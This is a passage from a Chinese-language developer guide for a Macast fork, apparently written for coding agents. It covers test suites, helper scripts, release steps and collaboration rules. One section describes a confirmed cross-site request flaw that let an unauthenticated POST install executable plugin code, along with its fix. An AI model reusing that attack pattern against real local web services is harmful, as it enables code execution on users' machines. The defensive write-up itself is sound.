块）逐个验过，各自必红）+ **镜像控制台与实时链路**（Part 35 页面读的端点、`mirror_view.py` 的派生规则、页面与后端共享的拼写；Part 36 菜单栏自己的内容，含"不许出现电脑投屏行"这条用户裁定；Part 37 实时链路的算术 —— 队列的秒预算、丢弃切在容器边界、DLNA 预填的秒数、没动过设置时 `auto` 选哪个编码器；Part 38 采集开了却一帧不返回 —— 挡掉"正常采集也会打"的运行时噪声、弃掉读不到的音频口重起一次、每一条"没有返回画面"都必须给出门与重启、弃声的会话在页面上不再被那一行「已启用」谎称有声音；Part 39 Windows 系统声音的真实设备表 + 一条 M-SEARCH 到底出不出本机 + 延迟预算 + 真 TCP socket 上的 Nagle 修复；Part 40 只有**打包后的** Windows 才教得了的三件事（首帧预算杀死了声音口已谈拢的采集、把 Windows 用户送去 macOS 的麦克风面板、`cheroot.ssl` 没进包 —— §4.3 那一族）；Part 41 `.exe` 不许弹控制台窗口（`--noconsole` 与每个子进程的 no-window 标志缺一不可，还有 windowed 进程根本没有 `stdout`）；Part 42 真 TCL 85T8G「下载了 26 MB 却仍然不播」⇒ 响应必须带上 DIDL 承诺的 `DLNA.ORG_PN`、一次交换要落在**用户真会留的日志**里且不能被重试刷爆、对端关掉的连接要认出自己这一半的 CLOSE_WAIT；Part 43 第二个观看端加入实时 Matroska —— 输入是**真编码器管道**产出的 `scripts/fixtures/live-mkv-h264.bin`，元素树在下面用**另一个**解析器重读一遍，免得 fixture 与实现共谋；**Part 44 设置页「帮助」弹层与页宽（见 §4.13）—— 弹层里每一句可核对的陈述都被要求由决定它的那段代码回答**：端口问 `cast.CAST_PORT` / `airplay.AIRPLAY_PORT`、HTTPS 问 `utils.py` 的 +1、配置目录问 `user_config_dir('Macast', 'xfangfang')`、镜像目标与「哪条没有声音」逐 bullet 比对 `screen_mirror.OUTPUTS`、低延迟上限比对 `CAST_STREAM_MAX_BITRATE`、DLNA 档位与预填秒数比对 `DLNA_PROFILES` / `DLNA_PREFILL_SECONDS`、无帧超时比对 `NO_FRAME_SECONDS`、字幕扩展名比对 `protocol.py` 的 `sub_exts`、日志上限比对 `RotatingFileHandler` 的 `maxBytes`/`backupCount`、标签页列表比对页面里的 `el-tab-pane`；页宽一侧则守 `box-sizing`、`min(1680px,100%)`、`.pane-duo` 用 `auto-fit`（两张卡的行不许在宽屏留半页空白）、以及弹层自带 `background: var(--panel)` + `color: var(--text)`（深色模式白底压白字）；**Part 46 CI 的 Actions 存储配额（见 §4.3）—— 四个 `Upload artefact` 步骤必须带同一个门（只有 tag push 与 `release=true` 的手工 dispatch 才上传）、清扫 job 必须 `needs: release` 且只在发布成功时按 id 删除本轮 artefacts、`actions: write` 与 `::warning::` 缺一不可、留存仍是 2 天兜底；三条变异体（改开一个门 / 删权限 / 放宽成 `always()`）逐个验过各自必红**；**Part 47 菜单栏的线程纪律（见 §4.2 末条）—— `App.notification` 与 `Macast.update_service_status` 必须把 AppKit 那一跳交给主线程队列：用例从 `CHERRYPY_WORKER_47`/`SERVICE_THREAD` 两个假线程各打一次，要求"就地什么都没发生、排队的东西在 MainThread 落地"，并扫 `macast.py`（七处写入点逐条登记主线程理由）与 `macast/plugins/**`（只许 `build_menu*`/`on_*`）；两个变异体（把 notification 改回就地调用 / 把 relabel 改回就地赋值）各自红 5 条与 7 条；另有四条把"被守的调用点有多少"这个数交给 **AST 现数**（注释掉的 `publish` 不算、跨行的算一处），再拿它去比对**两处散文**（Part 47 的抬头与 §4.2 本条，含 `macast/` + `macast_renderer/` 的拆分）—— §4.13 的"每个数字问两遍"同样适用于我们自己的文档。延后到底能不能落地是**真机**问题，已用真 rumps 循环探过：`app.run()` 之前排的队，循环一起来就执行**；**Part 48 管理 POST 的两道门（见 §4.7b）—— 先证明这道门真的挡不住（PoC 打真应用：无令牌 form-POST `install-plugin` 4/4 拿到可 import 的 `.py`），再修：`_same_site()` 挡跨站表单（Origin 缺失退 `Referer`，比对**名字**不是地址，所以 DNS rebinding 也算跨站），`_CODE_EXECUTION_PARAMS` 那三条会落代码的 POST 另加一道**令牌**门（本机也不算，因为环回挡不住浏览器）。断言分三层：门本身（喂真 `cherrypy.serving.request`，四种来源各判一次）、页面侧文本契约（`management_token` / `require_management_token` 必须在，`before-upload` 必须是 `async` 且 `:data` 带 token）、以及**前提自己也要扫**（全仓扫一遍"没有任何地方发 CORS 头"这句仍然成立；这条用例第一次写错成"字符串出现过就算红"，被自己的扫描误伤，所以现在扫的是**行**并要求那一行真在做 `tools`/`headers` 赋值，另外三条合成行反过来证明扫描器会红）。四个变异体各自变红（删 same-site 调用 5 条 / 把令牌门降级成 `_management_allowed` 7 条 / 页面某条流程漏带令牌 1 条 / 把门改成"什么都不放行" 15 条 —— Part 12/20/21/22/28/48 都从这条路上过，正向契约同样有牙齿），拒绝类用例都配正控（带令牌的两次必须真的过）**；**Part 49 订阅表是发布的、不是就地改的（见 §4.2「copy-on-write」条）—— 先用两个真线程把崩溃复现出来再修**：状态页那条合并表读 8 秒 110 次（被 try/except 吃掉 ⇒ 「客户端信息」整块消失），`add_subscribe` 那条 20 秒 148,302 次且**没人兜** ⇒ 控制点吃 HTTP 500 后永久不再收事件（症状长得像发送端的锅）。修复取 copy-on-write 而不是锁，因为广播那条读**横跨对每个订阅者的网络 I/O**；29 条用例分五层（发布契约 / 五条读路径各自对打一个真在 churn 的写线程且**同时要求读数过阈值** / 修复前的行为 / 两条"全仓库不许再出现就地扩容"的文本规则 / 订阅路径在 stdout 上一言不发），四个变异体各自红 8、1、1、1 条（就地写表 / 把绑定挪到排空队列之前 / 那行 `print` 回来 / 每轮都无条件发布）。**诚实的一条**：`add_subscribe` 自己的 race 在 600 entry 表下**没撞上**（扫描太短），那条路径靠发布契约与文本扫描守着，不靠计时|
| `cast_conformance.py` | **用真实 pychromecast 栈打真实接收端**（见 §4.9）。`verify_cast_airplay.py` 把网络打桩，所以抓不到"发送端不认账"；`vlc_sender_sim.py` 只复刻 VLC。这个跑的是手机/HA 实际用的那套代码 |
| `e2e_smoke.py` | **唯一跑真应用的检查**（33 条）：用临时配置目录 + 错开的端口（58999，只开 DLNA）在**本机拉起第二个 Macast**，走完发现→设置页→API→SSDP，可选走播放。**代价要明说：那 ~30 秒里局域网内的 DLNA 电视会短暂看到第二个设备**（`Macast E2E Smoke`）。隔离手法是 `appdirs.user_config_dir` 在 `import macast` **之前**打桩（§4.9 那条），种子设置直接写 JSON（绝不 `Setting.set`），所以它不动用户配置、不杀他的实例；跑完自己验一遍"真实配置目录的摘要前后一致"。它导不了 `macast`（自己就是启动者），因此对应用的耦合全是字符串——那些字符串由 Part 33 守着。`--play` 才做真正的播放回环（自己找 ffmpeg、生成 12 秒测试片、起一个支持 Range 的小 HTTP 服务、经带令牌的 GET 入口投出去、要求进度真的在动 + 日志里有 `video-reconfig`）；`--keep` 保留临时目录。**它是端到端冒烟，不是套件的替代**：跑套件仍然不需要它，跑它之前要确认用户不在演示 |
| `selfcheck.py` | 收屏前的环境自检：依赖、端口占用者身份、可广播网卡、组播出口、mpv/`--input-ipc-server`、代理变量。端口占用会区分"Macast 自己在跑"/"macOS 自带 AirPlay"/"别的进程"。被监督的外部程序（`uxplay`、`shairport-sync`）**是 warn 不是 fail** —— 插件是可选的；uxplay 那条直接把编译配方写进 fix，因为没有包可装。**发送端插件那一半（§「sender plugins」段）**：ffprobe 在不在、`-encoders` 里有没有 libx264 / h264_videotoolbox / mpeg2video / ac3（**这四个各自对应一条会静默失效的链路**）、有没有 libass（没有 ⇒ 字幕只能走 WebVTT）、avfoundation 到底列没列出屏幕（**这一条就是 v0.1–v0.7 那个解析 bug 想骗过去的问题**）、系统音频采集口（mac 看 HAL 里的 BlackHole 驱动、Linux 问 `pactl` 要 sink monitor）、转码临时目录剩余空间、以及**局域网里到底有没有东西可投**（mDNS browse `_googlecast._tcp` + 一次 SSDP `MediaRenderer` 探测）。它**只读**设置（直接读 JSON 文本，不碰 `Setting`），所以跑它不会改用户配置。Part 32 守着它和插件的一致性 |
| `provenance.py` | **谁写了这个仓库里的每一行**：以 fork 点 `1987923`（其父链 = 上游 215 条提交）为界，用 `git blame --line-porcelain` 把每个 `.py` 数成 `upstream` / `vendored` / `mixed` / `ours` 四态，并检查文件头的声明与这个事实是否一致。两个盲区是显式补的，不是留给读者的：① `macast/plugins/**` 是从 **另一个仓库** `xfangfang/Macast-plugins` 粘进来的，本仓库历史里查不到，所以靠 `VENDORED` 常量表而不是 blame（否则会被算成"我们写的"）；② 改名/挪位置的文件同样丢 blame，所以再比对 **blob SHA**（少于 5 行的文件不参与 —— 全世界空文件的 blob 是同一个）。`--check` 报漂移、`--stamp --apply` **只加声明、代码里没有删除路径**（Part 34 守着这句话）、`--json` 给套件。插入位置受 §4.5 约束（插件清单只从顶部**连续**注释块解析，位置歪了插件会静默装不上）。**改完任何 `.py` 的归属，必须同步 `docs/Provenance.md` 的 `provenance-ledger` 行与两张表**，否则 Part 34 红；它需要完整历史，浅克隆会直接报失败而不是假装通过 |
| `check_index_reachability.py` | 把 selfcheck「online plugin index」那段**离仓**跑一遍：不带 GitHub 凭据问三件事（本仓库是否匿名可见 + 公开上游对照组 + jsDelivr 元数据 API），再逐条问 `plugins/info.json` 的固定链接到底服不服务，输出 `INDEX_PRIVATE` / `INDEX_OK` / `INCONCLUSIVE` 之一 + 逐条状态表 + 退出码（0 全部可装，2 有死链，3 判不出）。`--json` 给 CI 用，`--url-only` 只回答单个 URL。为什么单独一个脚本：这是**发版后必做的那一步**（§8）——本地套件全绿只证明条目 == 所指内容，不证明别人拉得到，而私有仓库上的 CDN 缓存会**逐条过期**，没人碰它也会坏 |
| `vlc_sender_sim.py` | **忠实复刻 VLC 状态机**的发送端（含严格 protobuf 语义）。必须等到 `PLAYING` 才算通过 |
| `cast_probe.py` | 手写 TLS/CASTV2 的最小发送端，打逐步日志 |
| `cast_streaming_probe.py` | **把 `macast/plugins/renderer/screen_mirror.py` 的低延迟通道原样打到真电视上**（镜像接收器 `0F5096E8` + OFFER/ANSWER + UDP RTP）。它 `import` 插件本体而不是复刻协议，所以真机通过 = 设置页「电脑投屏」那条路通过。`--live` 采真桌面、`--source` 用文件、`--dump` 留 Annex-B 给 ffprobe。Part 24 只证明字节自洽，**这一步才证明电视认不认**（§4.9） |
| `smoke_discovery.py` | 真实网络发现验证 |
| `build_macos_arm.sh` / `setup_py2app.py` | 本地 macOS `.app` 构建（CI 用同一套，细节见 `BUILDING.md`） |

**本机造"发送端形态的流"**（不需要手机，用于复现"有声音没画面"这类问题）：

```shell
FF=/opt/homebrew/opt/ffmpeg/bin/ffmpeg      # brew 装了但**不在 PATH**
$FF -y -f lavfi -i testsrc2=size=640x360:rate=25 \
       -f lavfi -i "sine=frequency=440:sample_rate=48000" \
       -t 20 -c:v libx264 -preset ultrafast -pix_fmt yuv420p -c:a aac -shortest /tmp/cast_test.mp4
$FF -y -i /tmp/cast_test.mp4 -c copy -f mpegts /tmp/cast_test.ts
# 再起一个只返回这块 TS 的小 HTTP 服务挂在无扩展名路径上
# （Content-Type: video/mp2t，**必须支持 Range**，否则 mpv 报 loading failed）
.venv/bin/python scripts/vlc_sender_sim.py 127.0.0.1 8009 \
    "http://127.0.0.1:8010/chromecast/1/2/stream"
```

## 7. 文档索引

| 文档 | 内容 |
|---|---|
| `docs/Cast-AirPlay-Testing.md` | **真机验证指南 + 全部已修问题的完整复盘**（三轮："找不到 / 投不上 / 有声音没画面"） |
| `docs/Casting-Suite-Plan.md` | **发送端插件族的规划书**：JustStream 需求矩阵、六个参考项目（mkchromecast / MirrorCast / omacast / UxPlay / Castify / Mac-Screencast）的代码级取证与许可判定、P1-P6 阶段计划与「明确不做」。动镜像/投文件/投浏览器相关代码前先读它 |
| `docs/Casting-Suite.md` | **发送端插件的用户指南**（与上一行分工：规划书给改代码的人，这份给用插件的人）。每个目标的**首次设置流程**：Chromecast 兼容通道 / Chromecast 低延迟（含"上限 4.5 Mbps 是软件加密不是网络"）/ DLNA 老电视（含"约 4 秒预填是设计如此，且只在「伪装成文件」形状"与五档回退）/ 浏览器（观看地址与 token 的来历）；§1.6 说清画质档位、编码器与延迟预算各是多少；本地文件投屏的"自动"在判什么、音轨字幕为什么各有边界；uxplay 与 shairport-sync 的自备安装配方；macOS 屏幕录制权限与 BlackHole 一键设置。**每一节都写明"这条路真机验证到什么程度"** —— 全族只在打桩测试与自家假设备上验证过 |
| `docs/reference-projects-review.md` | 参考项目评估（**接收端**视角）：miraclecast / mkchromecast / AirConnect |
| `docs/Provenance.md` | **来源台账与重写队列**：fork 点与 215 条上游提交、`git blame` 的四态（upstream / vendored / mixed / ours）与它两个盲区（跨仓库粘贴、改名丢 blame）、按域的行数台账（应用本体还有约 3587 行是上游的；"看文件头"会高估成 21623 行，因为上游的头贴在代码早被重写干净的文件上）、`macast/ssdp.py` 里第三方 MIT 作者群那一层、按模块的 8 步重写队列（**完成判据是 `upstream_lines == 0`，可机检**）。**已定边界**：声明只加不减、不在 vendored 文件上署名、不把重写叙述成摆脱 GPLv3 的路径（净室才行）；"去掉 fork 与所有原项目信息"这一半已被拒绝 |
| `docs/Development.md` | 三平台开发与打包 |
| `BUILDING.md` | macOS `.app` 构建（py2app）、产物校验、包体裁剪 |
| `docs/i18n.md` | 翻译流程 |
| `docs/audit-2026-09.md` | 一次安全/健壮性审计记录 |

## 8. 发版流程

版本号有**两处**，必须一致（CI 会校验，不一致直接拒绝发布）：

```shell
macast/.version        # setup.py 用
macast/_version.py     # pyproject(动态版本) 用
```

```shell
# 1) 改两处版本号 + 文档
# 2) 推 main
git add -A && git commit -m "..." && git push origin main
# 3) 打 tag 触发 CI 构建并自动创建 Release
git tag v0.7.11 && git push origin v0.7.11
```

`.github/workflows/build.yml` 会在 tag push 时构建 macOS arm64、Linux x86_64/arm64、
Windows x86_64（**没有 macOS Intel**：`macos-13` 那条队列曾排到 30+ 分钟，`f8b3a15` 起
不再构建，本地要出 Intel 包用 `MACAST_ARCH=x86_64 scripts/setup_py2app.py`），
并在版本一致性校验通过后创建 Release。
产物名形如 `Macast-MacOS-arm64-v<版本>.zip`。

> 也可在 GitHub UI → Actions → Build Macast → Run workflow → `release=true`。

**发版后必做（CI 绿不代表产物能用，见 §4.3）**：

```shell
# 1. 等 CI 跑完，确认 4 个产物都在
gh run list --workflow=build.yml --limit 3
gh api repos/pingod/Macast/releases/tags/v<版本> --jq '.assets[].name'
#    （本机 `/opt/homebrew/bin/gh` 已登录 pingod，scopes 含 repo + workflow；
#     REST API 同样可用：https://api.github.com/repos/pingod/Macast/releases/tags/v<版本>）
# 2. 下载 macOS 产物、替换安装（旧包先移废纸篓，不要硬删）
#    注意下载来的包带 quarantine 属性，需 xattr -dr com.apple.quarantine
# 3. 真正启动并验证
open -a /Applications/Macast.app && sleep 15
lsof -nP -iTCP:8009 -sTCP:LISTEN      # 应有进程
curl -s 'http://127.0.0.1:58880/api?query=status' | head -c 200   # 应返回版本号
dns-sd -B _googlecast._tcp            # 5 秒后应有 Macast-<主机名>
# 4. 只有要测「电脑投屏」时：先重新勾一次录屏授权，再判定镜像坏没坏
```

**替换安装后有三件事会被误读成"新产物坏了"，都是本机 2026-09-23 实测过的：**

- **`open -a /Applications/Macast.app` 可能什么都不启动**（LaunchServices 还认那个刚被移走的
  旧实例）。可靠写法是 `open -n -a /Applications/Macast.app`。
- **不要用 `Contents/MacOS/Macast` 做"包起不起来"的冒烟**（本轮就在这上面栽了一次）：它读的是
  **用户真实的配置目录**，而旧实例还在听 58880 ⇒ 按 §4.2 那条端口回退逻辑，它会挑一个随机端口
  并把 `ApplicationPort` **写进真实设置**、同时重置 USN（本机实测：`58880 → 50116`，
  `macast_setting.json` 当场被改）。要证明包是好的，就直接装到 `/Applications` 再 `open -n -a`；
  万一已经误起了第二个实例，还原顺序是：`kill -2` 掉真实实例（它会自己按内存里的值回写）、
  确认 `keys` 数与 `USN` 没继续变，再把 `ApplicationPort` 改回bound 端口。
  带临时配置目录的启动只有 `scripts/e2e_smoke.py` 会做（§4.9 那条 `appdirs` 打桩）。
- **录屏授权记在"那一个包"的代码身份上，换了包就失效一次**：装完新包第一次镜像会报
  「屏幕采集在 3 秒内没有返回画面」（预览那张图则是「预览采集超时（8 秒）：屏幕可能锁了，
  也可能是这个 Macast 还没有屏幕录制授权 —— …，勾选后重启 Macast」；两条句子都点名门），
  带音频与只带画面两路
  都一样 —— 那是授权，不是链路。**区分"锁屏"与"没授权"的判据**：同一分钟、同一个设备号，
  从 shell 直接跑 `ffmpeg -f avfoundation -i "3:none" -t 3 …` 能写出 1.1 MB H.264
  ⇒ 屏幕没锁，缺的是这个包的授权（shell 那一路有自己的身份）。而 `TCC.db` 里
  `kTCCServiceScreenCapture` / `cn.xfangfang.Macast` 那一行**不会替你说话**：本机实测它停在
  `auth_value=2`、`last_modified=13:18:20`，新装的包（13:37）拿不到帧也不会改写这一行。
  修法是让用户在「系统设置 → 隐私与安全性 → 屏幕录制」里把 Macast 关掉再打开（列表里有两个
  就删掉旧的），然后重启 Macast —— **这是系统设置，别代用户点**。完整说法见 `docs/Casting-Suite.md` §5。

**改成了同一版本号重新发布时**：两个方向都走得通 —— `gh release delete v<x>`（默认只删
Release、**保留 git tag**，v0.7.15 之前那 14 个 Release 就是这么清的）可以直接把同名
Release 撤掉；或者不动 Release，把 tag 移到修复提交后强推
（`git tag -f v<x> && git push -f origin v<x>`），CI 会用同名文件**替换** release 里的产物。
用 digest 对比确认真的换了：

```shell
# GET /releases/tags/v<x> 里每个 asset 的 digest 字段
```

## 9. 当前能力边界（别当成 bug）

| 能力 | 状态 |
|---|---|
| DLNA（SSDP + UPnP）接收 | 完整 |
| Chromecast 接收（Cast v2，URL 投屏） | 可用；**未认证接收端**，Google 官方发送端可能因设备认证失败 |
| AirPlay 视频 URL 投屏 | 可用 |
| AirPlay 音频（RAOP） | 核心未实现，但内置插件 `macast/plugins/protocol/raop.py` 可监督 shairport-sync 接收（见 §4.8） |
| AirPlay 屏幕镜像（这台 Mac 当接收端） | 核心未实现，但内置协议插件 `macast/plugins/protocol/airplay_mirror.py` 可监督 **uxplay** 接收 iPhone / 另一台 Mac 的镜像（见 §4.8）。**旧结论「需要 FairPlay 解密，不打算做」是过时的**：AirPlay 2 Legacy 的镜像流是 **AES-128-CTR**，密钥从 pair-setup/verify 协商出的材料推出，uxplay 已实现配对（`/pair-setup` ed25519，密钥落 `~/.uxplay.pem`），**没有任何需要破解的东西**。真正的代价是 macOS 既没有 Homebrew formula 也没有官方二进制，得用户自己编译；Apple 哪天砍掉 Legacy 会**静默失效**。一期让 uxplay 自己开窗渲染，`-vrtp → mpv` 统一渲染留在二期 |
| DRM 内容 | **不可能支持**（受保护 app 镜像出来本来就是黑屏） |
| 插件 | 支持启用/停用/卸载/安装（**热生效，不重启**）；卸载进 `.trash/` 可恢复 |
| 内置插件（第一方） | `macast/plugins/` 下 15 个（6 个来自上游合集 vendored + 9 个本 fork 自研）：yt-dlp 下载/边下边播、外部播放器、小窗+壁纸、自动化钩子、Chromecast 中继、AirPlay 音频（RAOP）、屏幕镜像（三平台 → Chromecast、**没有 Google 栈的老电视（DLNA，伪装成文件，五档兼容档位 + 档位自动回退）**、**或任意浏览器打开一个网址**；Chromecast 有**两条通道**：兼容的 LOAD/mpegts 与**实验性 Cast Streaming 低延迟**（不走 HTTP/LOAD，设备拒绝就自动回落；纯 Python 加密 ⇒ 上限 4.5 Mbps、**本通道无声音**（设备不认它时自动回落到上面那条有声音的通道）、**未经真电视验证**）；画质四档 + 多显示器 + 指针开关 + macOS VideoToolbox（`auto` 探测到有硬件就用它）；**这一族的控制面自 v0.11 起全在设置页的「电脑投屏」tab，v0.12 起菜单栏只剩通知**（Part 36 守着）；系统音频 mac 有**一键辅助安装 BlackHole**（v0.7：进度页 + 指名失败步骤 + 残留记录/未重载 coreaudiod 两类根因；v0.12 起控制台分得清「已启用」与「有声音进来」）、Linux 走 pulse monitor、Windows 仅画面）、**本地文件投屏（磁盘上的文件/文件夹/播放列表 → Chromecast 或 DLNA 电视：能原生解码就按字节直供（Range/206，远端自己暂停拖动），否则 ffmpeg 边播边转（会增长的临时文件）；音轨选择 + 音画同步偏移 + 字幕（Cast 走 WebVTT、转码走 libass 烧制）；自动连播、被抢占后看门狗重投（最多 3 次）、停止发 QUIT_APP、只投系统声音的音频档）**、**AirPlay 镜像接收（监督 uxplay，让 iPhone 把屏幕镜像到这台 Mac；uxplay 要用户自己编译）**。**安装只有手动这一条路**（§4.6：仓库保持私有，设置页的「可安装」卡片在别人机器上拉不到索引）|
| 端到端回归 | `scripts/e2e_smoke.py`（33 条，唯一跑真应用的检查）—— 但它会在本机起第二个 Macast 约 30 秒，局域网电视会短暂看到 `Macast E2E Smoke`，**所以不进套件、只在发版前手动跑** |
| 网页投屏入口 | `GET /api?query=cast&url=<绝对地址>&token=<令牌>`（脚本 / 快捷指令 / 书签，绕开 DLNA 发现）；令牌常驻并显示在设置页 |

## 10. 与用户协作的约定（这个仓库的历史教训）

- **不要为了验证去改用户的真实配置**：所有涉及设置的测试用临时 `SETTING_DIR` +
  临时 `setting_path`，测试完还原。（曾因此被用户明确纠正。）
- **改前端（`macast/xml/setting.html`）要用真浏览器验收，三档宽度各看一遍**：
  起一个临时配置目录 + 错开端口的实例（**绝对不碰用户 58880 上那个**），
  窄 / 中 / 宽各截一次图。深色模式的弹层问题就是这类只在真截图里现形的缺陷
  —— Part 44 能守住数字与拼写，守不住"白底压白字"。（另记：`load_xml` 缓存模板，
  改完必须重启实例才生效，见 §4.2。）
- **明确区分"发送端问题"和"我们的问题"再动手**：这个项目里多次出现"用户报我们的 bug，
  实际是发送端行为"，先拿证据（日志/事件/源码）再改代码。
- **破坏性操作要可逆**：删插件用 `mv` 到 `.trash/`；删除/覆盖用户文件前先备份。
- **提交前自查暂存内容**，别夹带构建产物/密钥/`macast.log`。
